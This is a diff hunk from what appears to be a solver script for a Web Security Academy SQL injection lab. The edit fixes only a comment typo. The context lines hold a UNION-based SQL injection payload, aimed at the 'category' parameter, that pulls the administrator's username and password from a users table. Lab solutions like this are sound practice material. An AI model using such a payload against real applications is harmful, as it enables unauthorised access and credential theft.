@@ -33,7 +33,7 @@ url = "https://0a5300720330397188de5ce90093003f.web-security-academy.net"
 
 print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
 
-# payload to retreive the password of the administrator
+# payload to retrieve the password of the administrator
 payload = f"' union SELECT username, password from users where username = 'administrator'-- -"
 
 try:
